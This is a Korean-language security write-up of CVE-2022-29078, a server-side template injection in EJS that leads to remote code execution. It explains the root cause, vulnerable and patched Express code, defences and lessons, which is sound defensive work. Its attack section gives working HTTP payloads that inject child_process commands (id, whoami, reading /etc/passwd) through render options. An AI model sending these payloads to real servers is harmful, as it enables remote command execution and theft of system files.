# CVE-2022-29078 - EJS Server-Side Template Injection (SSTI)

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2022-29078 |
| CVSS | 9.8 (Critical) |
| 영향 소프트웨어 | EJS (Embedded JavaScript) |
| 영향 버전 | 3.1.6 이하 |
| 수정 버전 | 3.1.7 |
| 공격 유형 | SSTI → RCE |
| 발견일 | 2022-04-25 |

## 영향 범위 & 심각성

EJS는 Node.js 생태계에서 가장 널리 사용되는 서버사이드 템플릿 엔진 중 하나다. Express.js의 기본 템플릿 엔진으로 자주 채택된다.

**실제 영향:**
- npm 주간 다운로드 수천만 건의 인기 패키지
- Express.js + EJS 조합을 사용하는 모든 Node.js 서버가 잠재적 대상
- CTF(Capture The Flag) 대회에서 빈출되는 실전 취약점 유형
- 사용자 입력이 `render()` 옵션으로 전달되는 모든 엔드포인트에서 악용 가능
- 교육 프로젝트, 스타트업 MVP, 소규모 서비스에서 특히 위험 (보안 의식 부족)

## 취약점 기술 분석

### 근본 원인

EJS의 `render()` 함수에 전달되는 옵션 객체를 사용자가 제어할 수 있을 때, 내부 템플릿 설정을 조작하여 임의 코드를 실행할 수 있다.

**메커니즘:**
1. Express에서 `res.render(template, userInput)` 형태로 사용자 입력을 전달
2. EJS는 옵션 객체의 특수 속성(`settings`, `view options`)을 템플릿 컴파일에 사용
3. `settings['view options']['outputFunctionName']` 등을 주입하면 템플릿 컴파일 시 코드 삽입
4. 컴파일된 템플릿이 실행될 때 주입된 코드가 함께 실행

### 코드 레벨 분석

```javascript
// 취약한 Express 코드 패턴
app.get('/page', (req, res) => {
    // req.query가 직접 render의 데이터로 전달됨
    res.render('template', req.query);
});
```

```javascript
// EJS 내부에서 outputFunctionName이 코드에 삽입되는 방식
// ejs.js (단순화)
if (opts.outputFunctionName) {
    prepended += '  var ' + opts.outputFunctionName + ' = __append;\n';
    // outputFunctionName에 코드를 주입하면 여기서 실행됨!
}
```

### 핵심 문제

- **옵션과 데이터의 혼합**: 사용자 데이터와 템플릿 컴파일 옵션이 같은 객체에 전달
- **입력 검증 부재**: `outputFunctionName` 등 내부 속성에 대한 유효성 검증 없음
- **프로토타입 오염 연계**: `__proto__` 또는 `constructor.prototype`을 통한 공격도 가능

## 공격 시나리오

### 기본 SSTI 공격

```http
# outputFunctionName을 이용한 RCE
GET /page?settings[view%20options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('id');s HTTP/1.1
Host: target
```

### 공격 변형

```http
# delimiter 조작을 통한 공격
GET /page?settings[view%20options][delimiter]=x%0a})%0aglobal.process.mainModule.require('child_process').execSync('whoami')%0a//

# escapeFunction 조작
GET /page?settings[view%20options][escapeFunction]=1;return%20global.process.mainModule.require('child_process').execSync('cat%20/etc/passwd')
```

### 단계별 공격 흐름

1. **대상 식별**: EJS + Express를 사용하는 서비스 확인 (에러 페이지, 응답 헤더 등)
2. **파라미터 주입**: `settings[view options][outputFunctionName]`에 코드 삽입
3. **RCE 달성**: Node.js의 `child_process`를 통해 시스템 명령 실행
4. **후속 공격**: 리버스 쉘, 데이터 유출, 지속성 확보

## 방어 방법

### 즉시 조치
1. **EJS 3.1.7 이상으로 업그레이드**
2. 사용자 입력을 직접 render 옵션에 전달하지 않도록 코드 수정

### 코드 레벨 방어

```javascript
// 취약한 코드
app.get('/page', (req, res) => {
    res.render('template', req.query);  // 위험!
});

// 안전한 코드 — 명시적으로 필요한 데이터만 전달
app.get('/page', (req, res) => {
    const safeData = {
        title: sanitize(req.query.title),
        content: sanitize(req.query.content)
    };
    res.render('template', safeData);
});
```

### 추가 방어 계층
- Helmet.js 등으로 Express 보안 헤더 설정
- 입력 검증 미들웨어 (joi, express-validator) 적용
- `Object.freeze()` 또는 `Object.create(null)`로 프로토타입 오염 방지
- WAF에서 `settings[view` 패턴 차단
- Node.js 프로세스의 시스템 권한 최소화 (non-root 실행)

## 교훈

1. **사용자 입력 = 신뢰 불가**: 어떤 형태로든 사용자 입력을 내부 설정에 전달하면 안 됨
2. **템플릿 엔진의 위험**: SSTI는 모든 템플릿 엔진(Jinja2, Pug, EJS 등)에 공통적인 위험
3. **데이터와 코드의 분리**: 데이터 전달 경로와 코드/설정 전달 경로를 분리해야 함
4. **프레임워크 편의성의 함정**: `res.render(tpl, req.query)` 같은 간편 패턴이 보안 취약점으로
5. **npm 의존성 보안 감사**: 인기 패키지도 크리티컬 취약점을 가질 수 있음

## 참고 자료

- [NVD - CVE-2022-29078](https://nvd.nist.gov/vuln/detail/CVE-2022-29078)
- [GitHub Advisory GHSA-phwq-j96m-2c2q](https://github.com/advisories/GHSA-phwq-j96m-2c2q)
- [EJS GitHub Issue](https://github.com/mde/ejs/issues/720)
- [HackTricks - EJS SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ejs)
